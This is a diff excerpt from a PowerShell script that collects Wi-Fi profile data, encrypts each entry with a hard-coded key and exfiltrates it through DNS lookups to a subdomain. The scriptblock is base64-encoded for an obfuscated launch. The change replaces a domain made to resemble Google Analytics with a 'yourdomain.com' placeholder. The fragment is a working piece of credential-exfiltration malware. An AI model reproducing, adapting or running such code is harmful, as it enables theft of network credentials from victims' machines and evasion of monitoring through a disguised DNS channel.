@@ -63,7 +63,7 @@ $scriptblock={
   $wifinames.trim()
  }
  $KEY="EncryptDataWithThisCode"
- $SUB=".e.googlenalytics.com"
+ $SUB=".i.yourdomain.com"
  wifi|%{enc -K "$KEY" -T "$_"}|%{dns "$_"}|out-null
 }
 $encoded = [convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptblock))
